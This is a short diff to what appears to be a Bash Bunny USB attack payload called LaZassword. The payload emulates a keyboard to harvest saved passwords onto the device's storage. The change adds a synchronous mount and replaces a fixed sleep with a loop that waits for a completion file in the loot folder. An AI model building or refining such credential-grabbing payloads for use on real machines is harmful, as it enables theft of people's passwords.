@@ -9,7 +9,7 @@ LED SETUP
 ATTACKMODE HID STORAGE
 
 # Ensure loot is available for saving results.
-mount /dev/nandf /root/udisk/
+mount -o sync /dev/nandf /root/udisk/
 
 # Setup
 DUCKY_LANG=ch
@@ -28,5 +28,12 @@ Q LEFT
 Q ENTER
 
 # Wait until passwords are grabbed
-sleep 15
+while [ ! -f /root/udisk/loot/LaZassword/done ]
+do
+LED ATTACK
+done
+
+# Finish
+# The remove of the file is necessary. Else, the loop wouldn't work.
+rm /root/udisk/loot/LaZassword/done
 LED FINISH
